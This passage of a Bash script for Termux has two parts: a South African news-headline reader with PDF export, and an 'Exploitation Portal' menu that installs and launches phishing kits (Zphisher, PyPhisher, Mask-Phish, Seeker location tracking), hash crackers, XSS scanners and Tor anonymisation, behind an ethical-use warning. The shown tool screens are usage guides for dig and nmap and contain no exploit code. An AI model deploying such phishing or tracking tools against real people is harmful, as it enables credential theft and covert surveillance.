                        | grep -o '<pubDate>[^<]*</pubDate>' \
                        | sed 's/<pubDate>//g;s/<\/pubDate>//g' | head -n "$limit")
                    mapfile -t links_arr  < <(echo "$raw" \
                        | grep -o '<link>[^<]*</link>' \
                        | sed 's/<link>//g;s/<\/link>//g' \
                        | grep "^http" | head -n "$limit")

                    echo "<div class='section'><h2>$section_name</h2>"
                    local idx=0
                    for t in "${titles_arr[@]}"; do
                        # Skip duplicates
                        [[ "$seen_titles" == *"$t"* ]] && continue
                        seen_titles+="$t|"

                        local raw_link="${links_arr[$idx]:-}"
                        local pub_date="${dates_arr[$idx]:-}"

                        # Resolve Google redirect links to real URLs
                        local final_link="$raw_link"
                        if [[ "$raw_link" == *"news.google.com"* ]] && [[ -n "$raw_link" ]]; then
                            local resolved
                            resolved=$(curl -sI -L --max-time 6 "$raw_link" -o /dev/null -w '%{url_effective}' 2>/dev/null)
                            [[ -n "$resolved" && "$resolved" != "$raw_link" ]] && final_link="$resolved"
                        fi

                        echo "<div class='article'>"
                        echo "  <div class='headline'>$t</div>"
                        [[ -n "$pub_date" ]] && echo "  <div class='date'>$pub_date</div>"
                        if [[ -n "$final_link" ]]; then
                            echo "  <div class='link'><a href='$final_link'>$final_link</a></div>"
                        fi
                        echo "</div>"
                        ((idx++))
                    done
                    echo "</div>"
                }

                # ── Build HTML ──
                printf "  ${FADE}Building newspaper HTML...${RESET}\n"
                {
cat <<HTMLEOF
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Daily News — Fezzy Portals v1 Enhanced</title>
<style>
  body { font-family: Georgia, serif; background: #fff; color: #111;
         margin: 0; padding: 30px 40px; max-width: 900px; }
  .masthead { text-align: center; border-top: 4px solid #111;
              border-bottom: 2px solid #111; padding: 10px 0; margin-bottom: 20px; }
  .masthead h1 { font-size: 2.4em; margin: 0; letter-spacing: 2px; text-transform: uppercase; }
  .masthead .meta { font-size: 0.85em; color: #555; margin-top: 4px; }
  .weather { background: #f5f5f5; border-left: 4px solid #333;
             padding: 8px 14px; margin-bottom: 24px; font-family: monospace; font-size: 0.9em; }
  .section { margin-bottom: 28px; }
  .section h2 { font-size: 1.2em; text-transform: uppercase; letter-spacing: 1px;
                border-bottom: 2px solid #111; padding-bottom: 4px; margin-bottom: 14px; }
  .article { border-bottom: 1px solid #ddd; padding: 10px 0; }
  .article:last-child { border-bottom: none; }
  .headline { font-size: 1.05em; font-weight: bold; margin-bottom: 4px; }
  .date { font-size: 0.78em; color: #888; margin-bottom: 3px; }
  .link { font-size: 0.78em; color: #1a0dab; word-break: break-all; }
  .link a { color: #1a0dab; text-decoration: none; }
  .err { color: #c00; font-style: italic; }
  footer { text-align: center; font-size: 0.75em; color: #aaa;
           border-top: 1px solid #ddd; margin-top: 30px; padding-top: 10px; }
</style>
</head>
<body>
<div class="masthead">
  <h1>Daily News</h1>
  <div class="meta">Fezzy Portals v1 Enhanced &nbsp;·&nbsp; Strategy Over Impulse &nbsp;·&nbsp; philfesters &nbsp;·&nbsp; 999 &nbsp;·&nbsp; $(date '+%A, %d %B %Y &nbsp;·&nbsp; %H:%M')</div>
</div>
<div class="weather"><strong>Cape Town Weather:</strong> $wx_line</div>
HTMLEOF
                    _pdf_rss_block "Google News — South Africa" \
                        "https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en" 10
                    _pdf_rss_block "News24 — Top Stories" \
                        "https://feeds.news24.com/articles/news24/TopStories/rss" 8
                    _pdf_rss_block "EWN — Eyewitness News" \
                        "https://ewn.co.za/RSS%20Feeds/South-Africa" 6
                    _pdf_rss_block "IOL — Independent Online" \
                        "https://www.iol.co.za/rss/" 5
                    _pdf_rss_block "GroundUp — Social Justice" \
                        "https://www.groundup.org.za/feeds/latest/" 6
                    _pdf_rss_block "Daily Voice — Cape Town" \
                        "https://www.dailyvoice.co.za/feed" 6
                    echo "<footer>Generated by Fezzy Portals v1 Enhanced &nbsp;·&nbsp; Strategy Over Impulse &nbsp;·&nbsp; 999</footer>"
                    echo "</body></html>"
                } > "$htmlout" 2>/dev/null

                printf "  ${FADE}Converting to PDF...${RESET}\n"
                local pdf_ok=0
                if command -v wkhtmltopdf &>/dev/null; then
                    wkhtmltopdf --quiet --encoding utf-8 \
                        --margin-top 15mm --margin-bottom 15mm \
                        --margin-left 15mm --margin-right 15mm \
                        "$htmlout" "$pdfout" 2>/dev/null && pdf_ok=1
                fi
                if [[ $pdf_ok -eq 0 ]]; then
                    if python3 -c "import weasyprint" 2>/dev/null; then
                        python3 -c "from weasyprint import HTML; HTML(filename='$htmlout').write_pdf('$pdfout')" 2>/dev/null \
                            && pdf_ok=1
                    fi
                fi

                # Also copy to NEWSDIR with timestamp
                local ts_copy="$NEWSDIR/daily_news_$(date +%Y%m%d_%H%M%S).pdf"

                if [[ $pdf_ok -eq 1 ]]; then
                    cp "$pdfout" "$ts_copy" 2>/dev/null
                    echo ""
                    printf "  ${GRN}✓ PDF ready!${RESET}\n"
                    printf "  ${WH}  Primary  → %s${RESET}\n" "$pdfout"
                    printf "  ${WH}  Archive  → %s${RESET}\n" "$ts_copy"
                    echo ""
                    printf "  ${FADE}Open with: termux-open %s${RESET}\n" "$pdfout"
                else
                    echo ""
                    printf "  ${YEL}No PDF engine available — HTML saved:${RESET}\n"
                    printf "  ${WH}  %s${RESET}\n" "$htmlout"
                    printf "  ${FADE}Install: pkg install wkhtmltopdf -y${RESET}\n"
                    printf "  ${FADE}     Or: pip install weasyprint --break-system-packages${RESET}\n"
                    echo ""
                    printf "  ${FADE}Open HTML: termux-open %s${RESET}\n" "$htmlout"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            29)
                echo ""
                printf "  ${C20}[SAVED NEWS]${RESET} ${WH}%s${RESET}\n\n" "$NEWSDIR"
                local count; count=$(find "$NEWSDIR" -type f 2>/dev/null | wc -l)
                printf "  ${WH}%s saved file(s)${RESET}\n\n" "$count"
                if [[ "$count" -eq 0 ]]; then
                    printf "  ${FADE}No files yet — use [17] Save Headlines or [18] PDF${RESET}\n"
                else
                    find "$NEWSDIR" -type f -printf '%T@ %f\n' 2>/dev/null \
                        | sort -rn | head -20 | awk '{print $2}' | nl -w2 -s". "
                    echo ""
                    printf "  ${WH}Open file number (or ENTER to skip): ${RESET}"; read -r fnum
                    if [[ -n "$fnum" && "$fnum" =~ ^[0-9]+$ ]]; then
                        local ffile; ffile=$(find "$NEWSDIR" -type f -printf '%T@ %p\n' 2>/dev/null \
                            | sort -rn | awk '{print $2}' | sed -n "${fnum}p")
                        [[ -f "$ffile" ]] && termux-open "$ffile" 2>/dev/null
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            34)
                echo ""
                printf "  ${C20}[*] Fetching Google News SA headlines...${RESET}\n\n"
                local _raw34 _titles34=() _links34=()
                _raw34=$(curl -sL --max-time 12 \
                    -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                    "https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en" 2>/dev/null | sed 's/></>\n</g')
                mapfile -t _titles34 < <(echo "$_raw34" | grep -o '<title>[^<]*</title>' \
                    | sed 's/<title>//g;s/<\/title>//g;s/&amp;/\&/g;s/&#39;/'"'"'/g;s/&lt;/</g;s/&gt;/>/g' \
                    | grep -v "^[[:space:]]*$" | tail -n +2 | head -10)
                mapfile -t _links34 < <(echo "$_raw34" | grep -o '<link>[^<]*</link>' \
                    | sed 's/<link>//g;s/<\/link>//g' | grep "^http" | head -10)
                if [[ ${#_titles34[@]} -eq 0 ]]; then
                    printf "  ${RED}No headlines — check connection${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local i34
                for i34 in "${!_titles34[@]}"; do
                    printf "  ${C20}%2d.${RESET} ${WH}%s${RESET}\n" "$((i34+1))" "${_titles34[$i34]}"
                done
                echo ""
                printf "  ${C20}Pick number (0 to cancel): ${RESET}"; read -r pick34
                [[ "$pick34" == "0" || -z "$pick34" ]] && continue
                if [[ "$pick34" =~ ^[0-9]+$ ]] && (( pick34 >= 1 && pick34 <= ${#_titles34[@]} )); then
                    local art_link34 art_slug34 art_pdf34 real_link34
                    art_link34="${_links34[$((pick34-1))]}"
                    real_link34=$(curl -sI -L --max-time 8 "$art_link34" -o /dev/null -w '%{url_effective}' 2>/dev/null)
                    [[ -z "$real_link34" ]] && real_link34="$art_link34"
                    art_slug34=$(echo "${_titles34[$((pick34-1))]}" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/_/g' | cut -c1-40)
                    art_pdf34="$NEWSDIR/article_${art_slug34}_$(date +%Y%m%d_%H%M%S).pdf"
                    mkdir -p "$NEWSDIR"
                    local art_txt34="${art_pdf34%.pdf}.txt"
                    printf "\n  ${C20}[*] Saving article as TXT...${RESET}\n"
                    curl -sL --max-time 15 "$real_link34" 2>/dev/null \
                        | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -200 > "$art_txt34"
                    if [[ -f "$art_txt34" && -s "$art_txt34" ]]; then
                        printf "  ${GRN}✓ Saved: %s${RESET}\n" "$art_txt34"
                        echo ""
                        printf "  ${WH}[V] View now  [B] Open in browser (→ Share → Print → Save as PDF)  [ENTER] Skip: ${RESET}"
                        read -r art_act34
                        case "${art_act34,,}" in
                            v) less "$art_txt34" ;;
                            b)
                                termux-open-url "$real_link34" 2>/dev/null
                                printf "  ${FADE}In browser: tap ⋮ → Share → Print → Save as PDF${RESET}\n" ;;
                        esac
                    else
                        printf "  ${RED}Could not fetch article — check connection${RESET}\n"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            35)
                echo ""
                printf "  ${C20}[*] Fetching top 10 Google News SA headlines...${RESET}\n\n"
                local _raw35 _titles35=() _links35=()
                _raw35=$(curl -sL --max-time 12 \
                    -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                    "https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en" 2>/dev/null | sed 's/></>\n</g')
                mapfile -t _titles35 < <(echo "$_raw35" | grep -o '<title>[^<]*</title>' \
                    | sed 's/<title>//g;s/<\/title>//g;s/&amp;/\&/g;s/&#39;/'"'"'/g;s/&lt;/</g;s/&gt;/>/g' \
                    | grep -v "^[[:space:]]*$" | tail -n +2 | head -10)
                mapfile -t _links35 < <(echo "$_raw35" | grep -o '<link>[^<]*</link>' \
                    | sed 's/<link>//g;s/<\/link>//g' | grep "^http" | head -10)
                if [[ ${#_titles35[@]} -eq 0 ]]; then
                    printf "  ${RED}No headlines — check connection${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${WH}Saving %s articles as TXT — this will take a moment...${RESET}\n\n" "${#_titles35[@]}"
                mkdir -p "$NEWSDIR"
                local i35 ok35=0 fail35=0
                for i35 in "${!_titles35[@]}"; do
                    local t35="${_titles35[$i35]}"
                    local lnk35="${_links35[$i35]:-}"
                    printf "  ${FADE}[%d/%d] %s${RESET}\n" "$((i35+1))" "${#_titles35[@]}" "$t35"
                    [[ -z "$lnk35" ]] && { ((fail35++)); continue; }
                    local real35; real35=$(curl -sI -L --max-time 6 "$lnk35" -o /dev/null -w '%{url_effective}' 2>/dev/null)
                    [[ -z "$real35" ]] && real35="$lnk35"
                    local slug35; slug35=$(echo "$t35" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/_/g' | cut -c1-35)
                    local pdf35="$NEWSDIR/bulk_${slug35}_$(date +%H%M%S).txt"
                    local s35=0
                    if command -v wkhtmltopdf &>/dev/null; then
                        wkhtmltopdf --quiet --encoding utf-8 \
                            --margin-top 12mm --margin-bottom 12mm \
                            --margin-left 12mm --margin-right 12mm \
                            "$real35" "$pdf35" 2>/dev/null && s35=1
                    fi
                    if [[ $s35 -eq 0 ]] && python3 -c "import weasyprint" 2>/dev/null; then
                        python3 -c "from weasyprint import HTML; HTML(url='$real35').write_pdf('$pdf35')" 2>/dev/null && s35=1
                    fi
                    if [[ $s35 -eq 1 ]]; then
                        printf "  ${GRN}✓${RESET}\n"; ((ok35++))
                    else
                        printf "  ${YEL}✗ skipped — no PDF engine${RESET}\n"; ((fail35++))
                    fi
                    sleep 1
                done
                echo ""
                printf "  ${GRN}✓ Bulk done — %d saved · %d failed${RESET}\n" "$ok35" "$fail35"
                printf "  ${FADE}Files in: %s${RESET}\n" "$NEWSDIR"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            36)
                echo ""; printf "  ${C20}Keyword to filter headlines: ${RESET}"; read -r _kw
                [[ -z "$_kw" ]] && continue
                echo ""
                _dv20
                printf "  ${C20}${BOLD}KEYWORD FILTER: %s${RESET}\n" "${_kw^^}"
                _dv20; echo ""
                local _kw_found=0
                local _kw_sources=(
                    "Google News SA|https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en"
                    "News24|https://feeds.news24.com/articles/news24/TopStories/rss"
                    "EWN|https://ewn.co.za/RSS%20Feeds/South-Africa"
                    "GroundUp|https://www.groundup.org.za/feeds/latest/"
                    "IOL|https://www.iol.co.za/rss/"
                )
                for _ke in "${_kw_sources[@]}"; do
                    local _kl="${_ke%%|*}" _ku="${_ke##*|}"
                    local _kraw
                    _kraw=$(curl -sL --max-time 8 \
                        -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                        "$_ku" 2>/dev/null | sed 's/></>\n</g' \
                        | grep -o '<title>[^<]*</title>' \
                        | sed 's/<title>//g;s/<\/title>//g;s/&amp;/\&/g;s/&#39;/'"'"'/g' \
                        | grep -v "^[[:space:]]*$" | tail -n +2 \
                        | grep -i "$_kw")
                    if [[ -n "$_kraw" ]]; then
                        printf "  ${C20}── %s ──${RESET}\n" "$_kl"
                        while IFS= read -r _kh; do
                            printf "  ${WH}● %s${RESET}\n" "$_kh"
                            (( _kw_found++ ))
                        done <<< "$_kraw"
                        echo ""
                    fi
                done
                [[ $_kw_found -eq 0 ]] && printf "  ${FADE}No headlines matched '%s'${RESET}\n" "$_kw"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid choice${RESET}\n"; sleep 0.7 ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════════════
#  [21] EXPLOITATION PORTAL — ETHICAL SECURITY RESEARCH LAB
# ═══════════════════════════════════════════════════════════════════


_FHP_BOOTED=0

fezzyhacker_portal() {
    # ── ONE-TIME EXPLOITATION LAB BOOT SEQUENCE ──────────────────────
    if [[ $_FHP_BOOTED -eq 0 ]]; then
        _FHP_BOOTED=1
        clear
        echo ""
        printf "${C21}${BOLD}"
        printf "  ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗\n"
        printf "  ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n"
        printf "  █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   \n"
        printf "  ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   \n"
        printf "  ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   \n"
        printf "  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   \n"
        printf "${RESET}"
        echo ""
        printf "  ${FADE}P O R T A L   ·   S T R A T E G Y   O V E R   I M P U L S E   ·   9 9 9${RESET}\n"
        echo ""
        _dv21
        printf "  ${RED}${BOLD}  ⚠  ETHICAL USE WARNING  ·  READ BEFORE ENTERING  ⚠${RESET}\n"
        _dv21
        echo ""
        printf "  ${WH}  All tools in this portal are publicly available on GitHub.${RESET}\n"
        printf "  ${WH}  This portal is built for:${RESET}\n"
        printf "  ${WH}    ▸ Capture The Flag (CTF) competitions${RESET}\n"
        printf "  ${WH}    ▸ Authorized penetration testing${RESET}\n"
        printf "  ${WH}    ▸ Controlled lab & sandbox environments${RESET}\n"
        printf "  ${WH}    ▸ Personal education and security research${RESET}\n"
        echo ""
        printf "  ${RED}  ✖ Unauthorized use against real targets is illegal.${RESET}\n"
        printf "  ${RED}  ✖ You are solely responsible for how you use these tools.${RESET}\n"
        printf "  ${RED}  ✖ Fezzy Station and SOI take no responsibility.${RESET}\n"
        echo ""
        _dv21
        echo ""
        printf "  ${YEL}${BOLD}  Type  AGREE  to enter  ·  or  Q  to exit:  ${RESET}"
        read -r _xpl_agree
        if [[ "${_xpl_agree^^}" != "AGREE" ]]; then
            echo ""
            printf "  ${FADE}  Exploitation Portal — exited. Stay safe. SOI · 999${RESET}\n\n"
            _FHP_BOOTED=0
            return
        fi
        echo ""
        _dv21
        printf "  ${C21}${BOLD}▶  EXPLOITATION PORTAL  ·  INITIATING  ·  SOI PROTOCOL ACTIVE${RESET}\n"
        _dv21
        echo ""
        _spin "Ethical agreement confirmed — entering lab" 0.5 "${GRN}"
        _spin "Loading phishing frameworks" 0.4 "${C21}"
        _spin "Arming hash cracking suite" 0.4 "${FADE}"
        _spin "Loading XSS + web attack modules" 0.5 "${C21}"
        _spin "OSINT email modules ready" 0.4 "${FADE}"
        _spin "Vuln scanners armed" 0.4 "${C21}"
        _spin "Bojack securing the perimeter" 0.5 "${HOT}"
        _spin "DarkDump + recon stack loaded" 0.3 "${C21}"
        if [[ $FEZZY_PROXY_ACTIVE -eq 1 ]]; then
            _spin "ProxyChains + Tor confirmed — ghost mode active" 0.4 "${GRN}"
        fi
        echo ""
        _dv21
        echo ""
        _countdown "EXPLOITATION PORTAL LOCKED IN · SOI · 999"
        echo ""
        printf "  ${C21}${BOLD}32 tools loaded  ·  Zphisher · XSStrike · Hash-Buster · DarkDump · WhatWeb  ·  SOI  ·  999${RESET}\n"
        printf "  ${FADE}Know before you act. Leave nothing. Strategy Over Impulse.${RESET}\n"
        echo ""
        _dv21
        echo ""
        printf "  ${FADE}Press ENTER to enter the lab...${RESET}"
        read -r
    fi
    while true; do
        clear
        _portal_entry "Exploitation Portal" "${C21}"
        echo ""
        _dv21
        printf "  ${C21}${BOLD}EXPLOITATION PORTAL  —  Ethical Security Research Lab  ·  SOI  ·  999${RESET}\n"
        _dv21
        echo ""
        printf "  ${WH}32 tools · Recon · Phishing · Brute · XSS · Web Attack · Hash · OSINT · DarkSearch · SOI.${RESET}\n"
        printf "  ${FADE}■ CTF · Pen Test · Lab Use Only · Strategy Over Impulse · 999${RESET}\n"
        echo ""
        _dv21
        echo ""
        printf "  ${FADE}── RECON ──────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[1]${RESET}  ${WH}dig${RESET}           ${FADE}— DNS lookup · resolve domains · trace records${RESET}\n"
        printf "  ${C21}${BOLD}[2]${RESET}  ${WH}nmap${RESET}          ${FADE}— port scanner · host discovery · service enum${RESET}\n"
        echo ""
        printf "  ${FADE}── WEB EXPLOITATION ───────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[3]${RESET}  ${WH}wafw00f${RESET}       ${FADE}— WAF fingerprinting · detect Cloudflare/Akamai/130+ WAFs${RESET}\n"
        printf "  ${C21}${BOLD}[4]${RESET}  ${WH}photon${RESET}        ${FADE}— fast web crawler · URL/email/file harvest${RESET}\n"
        printf "  ${C21}${BOLD}[5]${RESET}  ${WH}nikto${RESET}         ${FADE}— web server scanner · vuln fingerprint${RESET}\n"
        echo ""
        printf "  ${FADE}── OSINT ADVANCED ─────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[6]${RESET}  ${WH}trufflehog${RESET}    ${FADE}— scan git repos for leaked secrets/keys${RESET}\n"
        printf "  ${C21}${BOLD}[7]${RESET}  ${WH}instaloader${RESET}   ${FADE}— Instagram profile/post/story downloader${RESET}\n"
        printf "  ${C21}${BOLD}[8]${RESET}  ${WH}theHarvester${RESET}  ${FADE}— email · subdomain · IP harvest from Google/Bing/LinkedIn${RESET}\n"
        echo ""
        printf "  ${FADE}── POST EXPLOITATION ──────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[9]${RESET}  ${WH}steghide${RESET}      ${FADE}— hide/extract data inside images · stego${RESET}\n"
        echo ""
        printf "  ${FADE}── INTEL & METADATA ───────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[10]${RESET} ${WH}osintgram${RESET}     ${FADE}— Instagram deep OSINT · followers · location${RESET}\n"
        printf "  ${C21}${BOLD}[11]${RESET} ${WH}gitleaks${RESET}      ${FADE}— scan repos for exposed secrets · API keys${RESET}\n"
        printf "  ${C21}${BOLD}[12]${RESET} ${WH}exiftool${RESET}      ${FADE}— read/strip file metadata · GPS · camera data${RESET}\n"
        echo ""
        printf "  ${FADE}── NETWORK PRIVACY ────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[P]${RESET}  ${WH}proxychains + tor${RESET} ${FADE}— install · configure · test · go ghost${RESET}\n"
        echo ""
        printf "  ${FADE}── GOOGLE DORKING ─────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[13]${RESET} ${WH}GDorker${RESET}       ${FADE}— Google dork builder · run from ~/Gdorker folder${RESET}\n"
        echo ""
        printf "  ${FADE}── TERMUX UI + VNC ────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[14]${RESET} ${WH}Termux11${RESET}      ${FADE}— Termux terminal theme / UI switcher${RESET}\n"
        printf "  ${C21}${BOLD}[V]${RESET}  ${WH}VNC Shortcut${RESET}  ${FADE}— launch XFCE4 desktop via Termux-X11 — fixed sequence${RESET}\n"
        echo ""
        printf "  ${FADE}── PHISHING & PEN TEST KIT ────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[15]${RESET} ${WH}PyPhisher${RESET}     ${FADE}— phishing page generator · 30+ templates · no root${RESET}\n"
        printf "  ${C21}${BOLD}[16]${RESET} ${WH}PenTestKit${RESET}    ${FADE}— recon · exploit · post-exploit toolkit · menu driven${RESET}\n"
        echo ""
        printf "  ${FADE}── PHISHING LAB ───────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[17]${RESET} ${WH}Zphisher${RESET}      ${FADE}— 30+ page phishing templates · Cloudflared tunnel${RESET}\n"
        printf "  ${C21}${BOLD}[18]${RESET} ${WH}ShellPhish${RESET}    ${FADE}— social media phishing · ngrok hosted${RESET}\n"
        printf "  ${C21}${BOLD}[19]${RESET} ${WH}Mask-Phish${RESET}    ${FADE}— mask phishing URLs · hide real link${RESET}\n"
        printf "  ${C21}${BOLD}[20]${RESET} ${WH}Seeker${RESET}        ${FADE}— location tracking via browser phishing · GPS · WiFi${RESET}\n"
        echo ""
        printf "  ${FADE}── HASH CRACKING ──────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[21]${RESET} ${WH}Hash-Buster${RESET}   ${FADE}— auto-detect + crack MD5/SHA1/SHA256 hashes${RESET}\n"
        echo ""
        printf "  ${FADE}── XSS ATTACK ─────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[22]${RESET} ${WH}XSStrike${RESET}      ${FADE}— advanced XSS scanner · WAF bypass · fuzzer${RESET}\n"
        printf "  ${C21}${BOLD}[23]${RESET} ${WH}XSSCon${RESET}        ${FADE}— fast XSS scanner · multi-thread · concurrent${RESET}\n"
        echo ""
        printf "  ${FADE}── WEB ATTACK ─────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[24]${RESET} ${WH}WebSploit${RESET}     ${FADE}— web/network exploit framework · menu driven${RESET}\n"
        printf "  ${C21}${BOLD}[25]${RESET} ${WH}Wfuzz${RESET}         ${FADE}— web app fuzzer · dirs · params · brute${RESET}\n"
        printf "  ${C21}${BOLD}[26]${RESET} ${WH}TakeOver${RESET}      ${FADE}— subdomain takeover scanner · 100+ services${RESET}\n"
        printf "  ${C21}${BOLD}[27]${RESET} ${WH}WhatWeb${RESET}       ${FADE}— identify CMS · frameworks · server software${RESET}\n"
        echo ""
        printf "  ${FADE}── OSINT EMAIL ────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[28]${RESET} ${WH}PwnedOrNot${RESET}    ${FADE}— check emails in breach databases · password leaks${RESET}\n"
        printf "  ${C21}${BOLD}[29]${RESET} ${WH}KnockMail${RESET}     ${FADE}— verify if email addresses are valid · SMTP check${RESET}\n"
        echo ""
        printf "  ${FADE}── VULN SCAN ───────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[30]${RESET} ${WH}Rang3r${RESET}        ${FADE}— fast port scanner + banner grabber${RESET}\n"
        echo ""
        printf "  ${FADE}── DARK SEARCH ─────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[31]${RESET} ${WH}DarkDump${RESET}      ${FADE}— search the dark web via Ahmia · no Tor required${RESET}\n"
        echo ""
        printf "  ${FADE}── WORDLIST ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[32]${RESET} ${WH}WlCreator${RESET}     ${FADE}— custom wordlist generator · target-based${RESET}\n"
        echo ""
        printf "  ${FADE}── TERMUX TOOL DICTIONARY ─────────────────────────────────────${RESET}\n"
        printf "  ${C21}${BOLD}[D]${RESET}  ${WH}Tool Dictionary${RESET}  ${FADE}— every tool explained · attack chains · DNS terms · search${RESET}\n"
        echo ""
        _dv21
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv21
        echo ""
        _hover_hint "fezzyhacker"
        echo ""
        printf "  ${C21}${BOLD}Tool » ${RESET}"
        read -r fhp_ch

        case "${fhp_ch^^}" in

            # ── [1] DIG ───────────────────────────────────────────────────
            1)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [1] DIG  ·  DNS LOOKUP${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}dig (Domain Information Groper) is a command-line DNS lookup tool.${RESET}\n"
                    printf "  ${WH}Query DNS records — A, MX, NS, TXT, CNAME, SOA and more.${RESET}\n"
                    printf "  ${WH}Trace the full DNS chain, test resolvers, enumerate subdomains.${RESET}\n"
                    printf "  ${WH}Essential first step in any recon — maps the target's DNS footprint.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic query:       dig example.com${RESET}\n"
                    printf "  ${WH}MX records:        dig example.com MX${RESET}\n"
                    printf "  ${WH}NS records:        dig example.com NS${RESET}\n"
                    printf "  ${WH}TXT records:       dig example.com TXT${RESET}\n"
                    printf "  ${WH}Reverse lookup:    dig -x 1.2.3.4${RESET}\n"
                    printf "  ${WH}Trace DNS chain:   dig +trace example.com${RESET}\n"
                    printf "  ${WH}Short output:      dig +short example.com${RESET}\n"
                    printf "  ${WH}Any record:        dig example.com ANY${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run dig${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r d_ch
                    case "${d_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Domain or IP: ${RESET}"; read -r dig_target
                            printf "  ${WH}Record type [A/MX/NS/TXT/ANY/trace] (default A): ${RESET}"; read -r dig_type
                            [[ -z "$dig_type" ]] && dig_type="A"
                            echo ""
                            _dv21
                            if [[ "${dig_type,,}" == "trace" ]]; then
                                dig +trace "$dig_target" 2>/dev/null | tee -a "$HACKDIR/dig_${dig_target}_$(date +%Y%m%d_%H%M).txt"
                            elif [[ "$dig_target" =~ ^[0-9] ]]; then
                                dig -x "$dig_target" 2>/dev/null | tee -a "$HACKDIR/dig_reverse_$(date +%Y%m%d_%H%M).txt"
                            else
                                dig "$dig_target" "${dig_type^^}" 2>/dev/null | tee -a "$HACKDIR/dig_${dig_target}_$(date +%Y%m%d_%H%M).txt"
                            fi
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing dig...${RESET}\n\n"
                            pkg install dnsutils -y
                            echo ""
                            command -v dig &>/dev/null && printf "  ${GRN}✓ dig installed.${RESET}\n" || printf "  ${YEL}Try: pkg install dnsutils${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [2] NMAP ──────────────────────────────────────────────────
            2)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [2] NMAP  ·  PORT SCANNER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Nmap (Network Mapper) is the industry-standard port scanner.${RESET}\n"
                    printf "  ${WH}Discover open ports, running services, OS fingerprints and more.${RESET}\n"
                    printf "  ${WH}Host discovery, TCP/UDP scanning, version detection, script engine.${RESET}\n"
                    printf "  ${WH}From a quick ping sweep to deep service enumeration — nmap handles it.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
